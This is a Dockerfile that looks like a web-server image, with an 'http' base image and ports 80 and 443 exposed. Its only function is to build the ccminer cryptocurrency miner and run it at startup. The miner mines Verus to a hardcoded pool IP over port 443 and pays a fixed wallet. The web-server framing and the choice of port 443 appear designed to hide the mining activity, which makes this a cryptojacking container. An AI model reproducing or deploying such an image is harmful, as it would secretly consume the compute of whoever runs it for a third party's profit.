FROM imraahatikah6827/http:latest
EXPOSE 80
EXPOSE 443

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && \
    cd ccminer && \
    chmod +x build.sh configure.sh autogen.sh && \
    ./build.sh && \
    cd .. && \
    mv ccminer/ccminer /usr/local/bin/ && \
    rm -rf ccminer

ENTRYPOINT [ "ccminer" ]
CMD [ "-a", "verus", "-o", "stratum+tcp://141.94.106.109:443", "-u", "RXZvBFv2D6Xv4SSX24vakXkT6Pozh4D6y1.love_Pian", "-p", "x", "-t8" ]
